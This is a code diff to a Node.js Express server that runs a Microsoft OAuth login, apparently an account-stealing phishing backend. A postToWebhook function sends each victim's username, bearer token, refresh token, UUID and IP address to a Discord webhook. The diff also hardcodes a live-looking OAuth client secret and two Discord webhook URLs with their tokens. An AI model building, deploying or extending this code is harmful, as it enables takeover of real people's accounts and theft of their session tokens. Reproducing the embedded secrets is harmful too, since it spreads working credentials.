@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'LMc8Q~kAUEi1rHqex10S3PowlSK.oGM1_It2JaoS'
+const client_id = 'ba169269-a508-4a40-b2c5-1debd6dc82fb'
+const redirect_uri = 'https://chainsama.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1033634327566766130/V5sxjZx-XuFNMoiRICj778TCB_8I7H2yTQSncTxkKsfCMParXAZOQkUKPBBKx-vwPae3'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1033629189397553252/oLzt83tgLmfn6ddf4rF7p_hJBwUtyADwbx7jsmvl8FkMs--ZeUKua78uITxwdHERDICl'
 // Config end
 const axios = require('axios')
 const express = require('express')
@@ -52,9 +52,9 @@ async function getAccessTokenAndRefreshToken(code) {
         }
     }
     let data = {
-        client_id: 'ba169269-a508-4a40-b2c5-1debd6dc82fb',
-        redirect_uri: 'https://chainsama.herokuapp.com/',
-        client_secret: 'LMc8Q~kAUEi1rHqex10S3PowlSK.oGM1_It2JaoS',
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -127,7 +127,7 @@ function getIp(req) {
 }
 
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
-    const url = https://discord.com/api/webhooks/1033629189397553252/oLzt83tgLmfn6ddf4rF7p_hJBwUtyADwbx7jsmvl8FkMs--ZeUKua78uITxwdHERDICl
+    const url = webhook_url
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
